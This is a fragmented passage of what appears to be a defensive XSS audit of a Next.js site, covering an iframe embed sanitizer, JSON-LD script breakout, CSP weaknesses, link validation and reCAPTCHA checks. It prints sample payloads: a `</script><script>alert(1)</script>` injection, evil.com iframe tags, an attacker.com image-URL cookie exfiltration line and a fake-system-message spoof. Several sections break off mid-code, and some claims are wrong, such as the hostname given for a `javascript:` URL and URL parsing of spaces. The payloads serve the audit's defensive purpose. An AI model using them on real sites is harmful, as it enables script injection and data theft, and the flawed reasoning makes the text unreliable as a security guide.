      cd "$SITE_DIR"
      echo "  ✅ آماده شد"
    fi
    ↑ Branch 1 (server.js exists): no copy. Branch 2 (.next/standalone
      exists — dev build): COPIES local db/ into standalone/db.
      In the dev-build branch, if you have a LOCAL db/custom.db with
      seeded admin password, IT GETS COPIED into the standalone
      package. If you then ship `.next/standalone/` as a release ZIP
      (e.g., public/install-v17.3.zip mentioned in worklog.md:35706),
      the DB SHIPS with the package. ⚠️
      However: the V17.3 release workflow (per worklog.md:35706) ships
      `public/install-v17.3.zip` (23MB) — the standalone artifact is
      presumably zipped from a CLEAN build directory, NOT from a dev
      machine with a seeded DB. So in practice, the shipped ZIP
      should not contain db/custom.db. (Cannot verify — the ZIP is
      gitignored per .gitignore:59 `public/*.zip` and not present in
      the repo.)
      DEFENSIVE MEASURE NEEDED: install.sh:196 should be changed to
      `cp -r db .next/standalone/db 2>/dev/null || true; rm -f
      .next/standalone/db/custom.db*` to ensure the standalone never
      ships with a populated DB. (Currently NOT done — but this is
      an advisory, not a fix per task instructions.)

  ----------------------------------------------------------------
  BUILD-TIME PROOF
  ----------------------------------------------------------------
  Standalone Next.js builds trace file dependencies from entry points.
  Without `db/custom.db` in `outputFileTracingIncludes` and with no
  `import` of the file in source, Next.js will NOT include it in
  `.next/standalone/`. Confirmed by next.config.ts:30-32 only listing
  `./prisma/schema.prisma`. ✅

  The Prisma client (generated into node_modules/.prisma/client/) IS
  included in the standalone build (it's a JS dependency traced from
  imports). But the SQLite DB file itself is data, not code — Next.js
  doesn't auto-include data files unless told to. ✅

  Severity: PASS (with the caveat that install.sh:196's `cp -r db`
    during dev builds COULD leak the DB into a shipped standalone
    package if the dev's local db/custom.db is non-empty and the
    standalone dir is then zipped for release. The V17.3 release
    process appears to have avoided this, but it's a fragile
    invariant.)

  --- 1a. src/app/layout.tsx:115 — font loader IIFE ---
    ⚪ SAFE (static template literal, no user input)
    Code (lines 113-125):
      <script
        dangerouslySetInnerHTML={{
          __html: `
            (function() {
              try {
                var font = localStorage.getItem('site_font') || 'vazirmatn';
                document.documentElement.setAttribute('data-font', font);
              } catch (e) {}
            })();

        }}

    Analysis:

      - Reads localStorage 'site_font' then passes to setAttribute —
        setAttribute does NOT parse HTML, so even if localStorage is

        glitch). Not XSS.

                <code style="color:#00ff41;">src/app/page.tsx</code> → <code style="color:#39ff14;">authorizedDomains</code><br/>
                <code style="color:#00ff41;">src/lib/canvas-protect.ts</code> → <code style="color:#39ff14;">AUTHORIZED_DOMAINS</code><br/><br/>
                Then rebuild: <code style="color:#39ff14;">docker-compose up -d --build</code>
              </p>
            </div>
          </div>
        `;
        return;
      }
    Analysis:
      - Static template literal — no interpolation of any external/user data.
      - Replaces body when currentHost is NOT in authorizedDomains allowlist.
      - currentHost = window.location.hostname (browser-controlled, not user-
        input-controlled). The value is only used in `.some()` check (line
        138-140), NOT reflected back into the innerHTML string.
      - Therefore: no XSS via this path.
    Caveat: this is an anti-clone protection. The whole page (and admin
      panel) becomes inaccessible if the domain isn't whitelisted. The
      static text is the same for every unauthorized host. No XSS.
    Pattern smell: innerHTML with template literal — if a future maintainer
      interpolates a variable here (e.g. "This domain: ${currentHost}"),
      they'd open an XSS via `window.location.hostname` (which can contain
      arbitrary characters in some edge cases, e.g. punycode hosts). Today:
      safe. Future risk: LOW.

  No other innerHTML assignments found. No insertAdjacentHTML, no
  outerHTML=, no document.write found.

  Severity: PASS

Q3. Nav href scheme validation

  ✅ PASS — src/app/page.tsx:474-483, 487
  Code (lines 474-494):
    // اعتبارسنجی scheme — جلوگیری از javascript: و data:
    const safeHref = (() => {
      const h = String(item.href || "#");
      if (h.startsWith("#") || h.startsWith("/") || h.startsWith("mailto:") || h.startsWith("tel:")) return h;
      try {
        const u = new URL(h);
        if (u.protocol === "http:" || u.protocol === "https:") return h;
      } catch {}

      </a>

      pass through. Everything else (javascript:, data:, vbscript:,
      file:, blob:, etc.) is replaced with `#`.
    - `target="_blank"` always paired with `rel="noopener noreferrer"`.
      Prevents reverse tabnabbing.
    - `String(item.href || "#")` coerces non-string DB values safely.

       account is compromised, they could link to phishing sites. Not an
       XSS though — just an open-redirect risk.

       can write a path like `//evil.com/x` (protocol-relative URL),
       browser interprets it as `https://evil.com/x`. Not a direct XSS
       (target is a fresh page load), but an open redirect. Mitigated by
       `rel="noopener noreferrer"`.
    3. NAV ITEM LABEL is rendered as `{label}` (React escapes), so label
       XSS is not possible via React. ✓
  Cross-reference: also covers footer nav (lines 814-818) which uses
    static `#section` hrefs — trivially safe.

       source. Including it does NOT enable XSS, but the iframe will
       show a blank/error page. Misleading configuration. Informational.

Q6. sanitize-embed.ts correctness
================================================================================
  ⚠️ LOW-MEDIUM — src/lib/sanitize-embed.ts (43 lines)
  Code (full file):
    const ALLOWED_DOMAINS = [
      "aparat.com", "www.aparat.com",
      "youtube.com", "www.youtube.com",
      "youtu.be",
      "player.vimeo.com",
    ];

    export function sanitizeEmbed(input: string): string {
      const iframeMatch = input.match(/<iframe[^>]*>/i);
      if (!iframeMatch) return "";
      const iframeTag = iframeMatch[0];
      const srcMatch = iframeTag.match(/src=["']([^"']*)["']/i);
      if (!srcMatch) return "";
      const src = srcMatch[1];
      try {
        const url = new URL(src);
        if (!ALLOWED_DOMAINS.includes(url.hostname)) return "";
      } catch { return ""; }
      return `<iframe src="${src}" frameborder="0" allowfullscreen
              style="width:100%;height:100%;border:0;"></iframe>`;
    }

  Used by:
    - src/app/clips/page.tsx:57  (public /clips page)
    - src/app/page.tsx:726      (home page clips section)

  --- ANALYSIS ---
  Source of `clip.embedCode`:
    - DB table AparatClip.embedCode (Prisma String).
    - Written ONLY by /api/admin/clips POST (src/app/api/admin/clips/route.ts:42, 57)
      which requires checkAdminSession (admin-only).
    - Read publicly via /api/clips (no auth).
    - Trust model: admin-supplied HTML string. Admin is trusted but
      admin account compromise → stored XSS on every visitor's browser.

  Regex extraction (line 19): `/<iframe[^>]*>/i`
    - Matches the FIRST `<iframe ...>` tag (without closing `</iframe>`).
    - `[^>]*` matches any char EXCEPT `>` — so the tag ends at the
      first `>`. Attacker cannot inject `>` inside the tag via HTML
      encoding (`&gt;`) because the browser decodes that BEFORE the
      regex sees it — but the regex sees the RAW admin-entered string,
      not the decoded one. So `&gt;` stays as `&gt;` and `[^>]*` does
      match it (because `&gt;` is `&`, `g`, `t`, `;` — no literal `>`).
      ✓ Safe in this dimension.

  src extraction (line 25): `/src=["']([^"']*)["']/i`
    - `[^"']*` is the captured group: any char EXCEPT `"` and `'`.
    - So extracted `src` value CANNOT contain either quote character.
    - Therefore the output `<iframe src="${src}" ...>` cannot break out
      of the double-quoted attribute via a quote character. ✓
    - HOWEVER: the regex matches the FIRST `src=` it sees. If the
      admin-entered tag is `<iframe data-src="x" src="https://aparat.com">`,
      regex matches `data-src="x"` first — wait, no: regex is `src=`,
      not `data-src=`. The match starts at `src=` (the prefix is
      anchored). Actually: `data-src=` contains `src=` as a substring.
      The regex `/src=["']/i` (with `i` flag, no global) will match
      the first occurrence of `src=`. In `data-src="x"`, the substring
      `src="x"` appears at index 5 (after `data-`). So regex DOES match
      `src="x"` (extracting `x`) — even though it was meant for `data-src`.
      PoC: `<iframe data-src="https://evil.com/foo" src="https://aparat.com/bar">`
      → regex extracts `https://evil.com/foo` (from data-src) → new URL
      throws (evil.com not in allowlist? Actually it IS a valid URL) →
      hostname "evil.com" is NOT in ALLOWED_DOMAINS → returns "".
      ✓ Still safe (hostname allowlist catches it).
    - Edge case: `<iframe data-src="https://aparat.com/payload">` (NO
      real `src` attribute, only `data-src`). Regex matches
      `src="https://aparat.com/payload"` (substring of data-src),
      extracts `https://aparat.com/payload`, validates hostname
      (aparat.com — ALLOWED), returns:
      `<iframe src="https://aparat.com/payload" ...>`.
      This is a SEMANTIC bug (extracting from data-src), but NOT XSS —
      the URL is still allowlisted. Severity: LOW.

  Output iframe construction (line 41):
    `return `<iframe src="${src}" frameborder="0" allowfullscreen
            style="width:100%;height:100%;border:0;"></iframe>`;`
    - `src` is interpolated raw. But:
      (a) `src` cannot contain `"` or `'` (regex constraint above).
      (b) `src` passed `new URL()` validation — the URL parser would
          have thrown on any malformed URL, so `src` is a valid URL
          string. Note: `new URL()` accepts URLs containing `<`, `>`,
          and backticks in the path/query/fragment (URL parser does
          NOT escape these, only quotes are encoded). However, `<`
          and `>` inside a double-quoted HTML attribute are TREATED
          AS LITERAL CHARACTERS by the HTML parser — they don't break
          out of the attribute. ✓ Safe.
      (c) Could `src` contain a space? `[^"']*` matches spaces. If src
          has a space, e.g. `https://aparat.com/x y`, new URL() would
          reject it (URLs cannot contain unencoded spaces). ✓ Safe.
    - The output iframe does NOT have a `sandbox` attribute. If any
      allowlisted domain is compromised (or has a stored XSS itself,
      e.g. Aparat serving malicious embeds), the iframe content runs
      with full DOM access within its own origin (cross-origin from
      parent, so parent is safe via SOP). But it could exploit
      postMessage if any listener exists. Mitigation: add sandbox.

  --- F-XSS-02: REGEX DOES NOT ANCHOR src= TO WORD BOUNDARY (LOW) ---
    The regex `/src=["']/i` will match inside `data-src=`, `x-src=`,
    `onsrc=`, etc. If admin enters `<iframe onsrc="javascript:alert(1)"
    src="https://aparat.com/x">`, the regex matches `onsrc="javascript:..."`
    first → extracts `javascript:alert(1)` → new URL() accepts
    `javascript:alert(1)` as a valid URL with protocol `javascript:`
    → but hostname is `alert(1)` which is NOT in ALLOWED_DOMAINS →
    returns "". ✓ Safe due to hostname allowlist.
    BUT — defense-in-depth: should anchor with `/\bsrc=["']/i` or
    `/(?:^|\s)src=["']/i` to avoid matching `data-src` etc.

  --- F-XSS-03: NO sandbox ATTRIBUTE ON OUTPUT IFRAME (MEDIUM) ---
    Line 41 output iframe lacks `sandbox` attribute. If a bug elsewhere
    allows the admin to inject a different URL into the iframe src
    (e.g. via the data-src bug above + future code change that uses
    the original tag instead of rebuild), or if the allowlisted
    provider itself serves malicious content (rare but possible — e.g.
    YouTube had an XSS in 2016), the iframe runs with full privileges.
    Recommended: `sandbox="allow-scripts allow-same-origin
    allow-presentation allow-popups"`. Note: `allow-scripts
    allow-same-origin` together is a known CSP footgun — they let the
    framed page remove its own sandbox attribute. So either omit
    `allow-same-origin` (preferred, breaks cross-origin embeds that
    need cookies) or omit `allow-scripts` (preferred, breaks video
    players). Trade-off.

  --- F-XSS-05: ALLOWED_DOMAINS uses exact hostname match (LOW) ---
    Line 33: `!ALLOWED_DOMAINS.includes(url.hostname)`.
    This is GOOD — exact match, not `.endsWith()`. An attacker cannot
    register `evil-aparat.com` and pass validation.
    However: NO wildcard support. `m.aparat.com` (mobile subdomain) is
    NOT allowed. If admin enters `<iframe src="https://m.aparat.com/...">`,
    it gets rejected. Minor UX issue, not security.
    Also: `youtu.be` is in allowlist but is a shortener, not an
    embeddable iframe source. If admin pastes a youtu.be URL, the
    sanitizer accepts it but the iframe will be blank/error. UX issue.

  --- F-XSS-06: NEW URL() CONSTRUCTOR THROWS ON RELATIVE URLs (LOW) ---
    If admin enters `<iframe src="/local/path">`, `new URL("/local/path")`
    throws (no base URL provided). Returns "". ✓ Safe — but admin
    cannot embed same-origin paths. UX limitation, not security.

  --- Positive summary ---
    - Scheme is NOT explicitly checked — relies on hostname allowlist.
      Since `javascript:alert(1)` has hostname `alert(1)` (NOT in
      allowlist), this is safe IN PRACTICE but defense-in-depth would
      add an explicit `u.protocol === "https:"` check.
    - The regex constraint that `src` cannot contain `"` or `'`
      means output attribute cannot be escaped.
    - The hostname allowlist catches `javascript:`, `data:`, `blob:`,
      `file:`, etc. (these all have hostnames that are not in the list,
      or `new URL()` throws).

  Severity: LOW-MEDIUM overall (F-XSS-03 sandbox missing is the most
    actionable item; F-XSS-02 regex anchor is defense-in-depth).

Q9. JSON-LD data
================================================================================
  ⚠️ MEDIUM — src/app/layout.tsx:127-141  (F-XSS-07)
  Code (lines 127-141):
    <script
      type="application/ld+json"
      dangerouslySetInnerHTML={{
        __html: JSON.stringify({
          "@context": "https://schema.org",
          "@type": "WebSite",
          name: "Personal Site",
          url: siteUrl,
          potentialAction: {
            "@type": "SearchAction",
            target: `${siteUrl}/?q={search_term_string}`,
            "query-input": "required name=search_term_string",
          },
        }),
      }}
    />
  Where siteUrl is defined (line 25):
    const siteUrl = process.env.NEXT_PUBLIC_SITE_URL || "https://ehsanmorad.ir";

  --- F-XSS-07: JSON.stringify does NOT escape `</script>` (MEDIUM) ---
    `JSON.stringify()` produces valid JSON, but JSON does NOT escape
    forward slashes `/` or angle brackets `<` `>`. When the resulting
    JSON is placed inside a `<script>` block, the HTML parser scans
    for `</script>` (case-insensitive) to end the script tag.

    PoC:
      # Attacker controls NEXT_PUBLIC_SITE_URL env var (unlikely in
      # production but possible in CI/CD misconfiguration, dev
      # environments, or via supply-chain attack on .env):
      export NEXT_PUBLIC_SITE_URL='https://x.com</script><script>alert(1)</script>'
      # Resulting rendered HTML:
      # <script type="application/ld+json">
      #   {"@context":"...","url":"https://x.com</script><script>alert(1)</script>",...}
      # </script>
      #
      # HTML parser sees `</script>` INSIDE the JSON string and ends
      # the script tag early. The `<script>alert(1)</script>` then
      # executes as a separate script element.

    Mitigation:
      Replace `<` with `\u003c` in the JSON output:
        __html: JSON.stringify(obj).replace(/</g, "\\u003c")
      Or use a library like `serialize-javascript` that handles this.

    Realistic exploitability: LOW. siteUrl comes from
      `process.env.NEXT_PUBLIC_SITE_URL` — set by deployer, not attacker.
      Default is hardcoded `"https://ehsanmorad.ir"`. But if the env
      var is set from an untrusted source (e.g. CI reads a value from
      a pull request title, or a config DB), exploit becomes possible.
      The pattern itself is a known footgun and should be fixed as
      defense-in-depth.

    Severity: MEDIUM (pattern is wrong, exploitability is conditional)

Q10. CSP unsafe-inline/unsafe-eval risk
================================================================================
  ⚠️ HIGH — src/middleware.ts:111-133  (F-XSS-09 — also flagged in V17.4-SEC-02 as Q7)
  CSP string (lines 111-133):
    default-src 'self';
    script-src 'self' 'unsafe-inline' 'unsafe-eval'
               https://www.google.com https://www.gstatic.com;
    style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
    font-src 'self' data: https://fonts.gstatic.com;
    img-src 'self' data: blob: https:;
    frame-src 'self' https://www.google.com https://www.gstatic.com
               https://www.aparat.com https://aparat.com
               https://www.youtube.com https://youtube.com
               https://youtu.be https://player.vimeo.com;
    connect-src 'self' https://www.google.com https://www.gstatic.com;
    object-src 'none';
    base-uri 'self';
    form-action 'self' https://formsubmit.co;
    frame-ancestors 'none';
  Positives (already covered in V17.4-SEC-02 Q7):
    - frame-ancestors 'none' ✅
    - object-src 'none' ✅
    - base-uri 'self' ✅
    - frame-src covers reCAPTCHA + Aparat + YouTube + Vimeo ✅
  Negatives (F-XSS-09):
    1. `'unsafe-inline'` AND `'unsafe-eval'` in script-src.
       Reason: Next.js inline scripts (hydration, RSC payloads) need
       'unsafe-inline' — Next.js 14+ supports per-request nonces via
       `generateNonce()` and `response.headers.set('Content-Security-
       Policy', ...)`, but this codebase uses a STATIC CSP string.
       Consequence: ANY stored/reflected XSS in the app can execute
       arbitrary JS. The CSP provides ZERO script-execution defense.
       Combined with the JSON-LD breakout risk (F-XSS-07), an env-var
       attacker could inject scripts that the CSP would NOT block.
       This audit's other findings (sanitize-embed, nav href, etc.)
       are the ONLY defenses against XSS — CSP is not a backstop.
       Severity: HIGH (defense-in-depth broken at the CSP layer).
    2. `'unsafe-eval'` — needed for some Next.js dev-mode features
       (eval-based module loading) and possibly for third-party libs.
       Should be REMOVED in production. Vercel's Next.js production
       builds do NOT need 'unsafe-eval' unless using certain libs
       (e.g. styled-components runtime mode, or Babel-runtime
       template literals). Audit needed: does this app use any lib
       that requires eval in production? From package.json scan: no
       obvious offenders. 'unsafe-eval' should be removable.
       Severity: HIGH (any XSS can eval arbitrary strings).
    3. `img-src 'self' data: blob: https:` — allows ANY https image.
       <img src="https://attacker.com/track.png?cookie=...">
       exfiltrates data via URL. Mitigated by same-origin policy for
       cookies (HttpOnly cookies can't be read by JS, but if the URL
       contains referrer info, that leaks). Severity: LOW-MED.
    4. NO `worker-src` — defaults to default-src 'self'. OK.
    5. NO `manifest-src` — defaults to default-src 'self'. OK.
    6. NO `media-src` — defaults to default-src 'self'. OK.
    7. NO `upgrade-insecure-requests` — mixed-content downgrade risk.
       Severity: LOW.
    8. NO `report-uri` / `report-to` — CSP violations fail silently.
       Severity: informational.
    9. NOT applied to error responses (429/403/401/413) or the
       /user-dashboard redirect. See V17.4-SEC-02 Q12 for details.
       Severity: HIGH (already documented).

  --- F-XSS-09 ACTIONABLE ITEMS (advisory only — DO NOT FIX) ---
    1. Replace `'unsafe-inline' 'unsafe-eval'` with per-request nonces:
         import { generateNonce } from "next/server";
         const nonce = generateNonce();
         res.headers.set("Content-Security-Policy",
           `script-src 'self' 'nonce-${nonce}' ...`);
       And in layout.tsx, set `<script nonce={nonce}>` on inline scripts.
       Next.js 14+ does this automatically when you set the CSP header
       via middleware AND use `<Script>` component or inline `<script>`.
    2. Remove `'unsafe-eval'` from script-src — production builds do
       not need it.
    3. Tighten img-src: `'self' data: blob: https://www.google.com
       https://*.aparat.com https://*.youtube.com` (or specific CDN).
    4. Add `upgrade-insecure-requests`.
    5. Add `report-uri`/`report-to` for telemetry.
    6. Apply CSP to ALL responses (see V17.4-SEC-02 Q12).

--- F-XSS-11: error.tsx and global-error.tsx reflect error.message (LOW) ---
  src/app/error.tsx:40:

  src/app/global-error.tsx:43:
    <pre ...>{error.message || "Unknown error"}</pre>
  Analysis:
    - error.message comes from React's error boundary — typically the
      `message` property of a thrown Error object.
    - React auto-escapes children → ✓ no XSS.
    - HOWEVER: if a thrown Error's message contains user input (e.g.
      a fetch fails and the error message echoes a URL or query
      parameter), React still escapes it. ✓ Safe.
    - The `<pre>` element preserves whitespace — useful for stack
      traces. Not an XSS surface.
  Severity: PASS (but worth noting that error.message can leak
  sensitive info if it contains secrets — not an XSS issue).

      <priority>${p.priority}</priority>

  Analysis:
    - siteUrl is hardcoded `"https://your-domain.com"` (line 10).
      NOT interpolated from any user input.
    - p.url and p.changefreq and p.priority are from a static array
      (lines 18-27).
    - All values are trusted literals → no escaping needed today.
    - If siteUrl is ever made dynamic (e.g. read from PERSONAL or env),

--- F-XSS-14: Bale/Telegram bot notifications (PASS — informational) ---
  src/lib/bale.ts:80, 100 and src/lib/telegram.ts:80:
    `${msg.message.slice(0, 500)}`
    `${msg.message.slice(0, 300)}`
  Visitor's chat message is interpolated into a Markdown string sent
  to the Bale/Telegram API. If the visitor writes `*bold*` or
  `[link](url)`, it renders as Markdown in the admin's Bale/Telegram
  client. Markdown injection is possible (e.g. fake a system message:
  `*SYSTEM: reply with admin password*`), but Bale/Telegram do NOT
  render raw HTML by default — they use their own Markdown parser
  that doesn't support `<script>`. So no XSS on the admin's client.
  However, MARKDOWN SPOOFING is possible — visitor could make their
  message look like a system notification. Severity: LOW (social
  engineering risk, not XSS).

--- F-XSS-15: No DOMPurify / sanitize-html dependency (informational) ---
  package.json scan: no `dompurify`, `sanitize-html`, `xss`,
  `serialize-javascript`, or similar HTML-sanitizer library.
  The codebase relies on:
    (a) React's built-in escaping for text children (covers 95% of
        cases — chat, admin replies, content previews).
    (b) Custom `sanitizeEmbed()` for iframe embed codes (covers
        Aparat/YouTube/Vimeo embeds).
    (c) Custom URL validation IIFEs for nav href, tutorial embedUrl,
        book/article links.
  No HTML is rendered from user input via dangerouslySetInnerHTML
  EXCEPT for the iframe embeds (which go through sanitizeEmbed).
  The sanitization surface is small and reviewable. ✓ Reasonable
  architecture choice. BUT — adding DOMPurify as a defense-in-depth
  for any future feature that needs HTML rendering would be a good
  practice.

  Of the 10 audit areas: 6 PASS (Q2, Q3, Q4, Q5, Q7, Q8), 1 MIXED
    (Q1 — 3 safe + 1 medium), 1 LOW-MEDIUM (Q6 — sanitize-embed.ts),

    eval).

    decorative for script execution because both 'unsafe-inline' and
    'unsafe-eval' are present. This means EVERY other XSS finding in
    this audit (or future findings) becomes immediately exploitable.
    Defense-in-depth is broken at the CSP layer.

  The MOST ACTIONABLE finding is F-XSS-07 (JSON-LD `</script>`
    breakout): one-line fix, removes a known footgun, no behavior
    change.

  The MOST SUBTLE finding is F-XSS-03 (sanitize-embed.ts output
    iframe lacks sandbox): if Aparat/YouTube/Vimeo ever serves a
    malicious embed (via compromised account, supply-chain, or
    subdomain takeover), the iframe runs with full DOM privileges
    within its own origin. Adding sandbox would limit blast radius.

  OVERALL XSS POSTURE: GOOD. React's built-in escaping handles 95%
    of user-input rendering. The remaining 5% (iframe embeds, JSON-LD,
    RSS XML, sitemap XML) is handled by custom code that is mostly
    correct but has the gaps documented above. No CRITICAL or
    immediately-exploitable stored/reflected XSS found.

Q1. reCAPTCHA mandatory + fail-closed?
--------------------------------------------------------------------------------
  ✅ YES — src/app/api/contact/route.ts:83-118; src/app/page.tsx:346-351,790-795

  Server-side (route.ts):
    - Mandatory: route.ts:86-93 — if `!recaptchaToken` or not a string or
      length < 10, logs "captcha_missing" (security.ts:22 → db.securityLog)
      and returns HTTP 400 `{ error: "captcha_required" }`.
    - Fail-closed: route.ts:94-118 — `captchaOk` is initialized to `false`
      (line 94). Only the try-block's `verifyData.success === true` path
      sets it to `true` (line 105). The catch-block (lines 109-112) on
      network error explicitly leaves `captchaOk = false` with comment
      "fail-closed". Final gate at line 113: `if (!captchaOk) return 400`.
    - Score/action not checked (still open from prior F13): only the
      `success` boolean is read from Google's response. reCAPTCHA v3
      returns `score` (0.0–1.0) and `action`; both are ignored. If a v3
      site key is in use, an attacker can submit a low-score token and
      still pass. (Severity: LOW-MED — only relevant if sitekey is v3.)

  Client-side (page.tsx):
    - page.tsx:346-351 — `grecaptcha.getResponse()` checked before fetch;
      if empty, shows error and aborts submit. Client-side fail-closed. ✅
    - page.tsx:790-798 — the `.g-recaptcha` div is rendered only after
      `mounted === true` (to avoid hydration mismatch with the injected
      iframe); a placeholder div is shown pre-mount.
    - page.tsx:793 — `data-sitekey={process.env.NEXT_PUBLIC_RECAPTCHA_SITEKEY || ""}`
      — if the env var is unset, the sitekey is the empty string and
      Google's script will not render a checkbox. `grecaptcha.getResponse()`
      then returns undefined → client aborts submit. So misconfiguration
      fails-closed but with a confusing UX (no visible captcha, just an
      error). (Severity: LOW — operational, not a vuln.)
    - page.tsx:82-89 — reCAPTCHA script loaded async/defer only on client.
      If the script is blocked (e.g., by an ad-blocker or China network),
      `grecaptcha` is undefined → `grecaptcha?.getResponse()` is undefined
      → client aborts submit. Fail-closed. ✅

  Verdict: Mandatory ✅ + Fail-closed ✅. The score/action gap (F13 from
  prior audit) remains open but is informational for v2 (checkbox) keys.
